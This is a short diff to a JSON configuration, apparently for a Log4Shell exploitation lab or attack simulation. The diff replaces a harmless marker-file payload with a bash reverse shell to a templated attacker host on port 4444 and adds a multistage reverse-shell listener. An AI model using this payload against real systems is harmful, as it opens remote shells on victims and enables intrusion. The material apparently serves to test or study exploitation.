@@ -15,7 +15,15 @@
               "attacker_ldap_port": 1389,
               "attacker_ip": "log4j-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8080,
-              "payload": "touch /tmp/log4shell_pwned"
+              "payload": "bash -i >& /dev/tcp/log4j-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1"
+            }
+          },
+          "responder": {
+            "reverse_shell_multistage": {
+              "enabled": true,
+              "listen_ip": "0.0.0.0",
+              "listen_port": "4444",
+              "payload": "touch /tmp/multistage_pwned"
             }
           }
         }
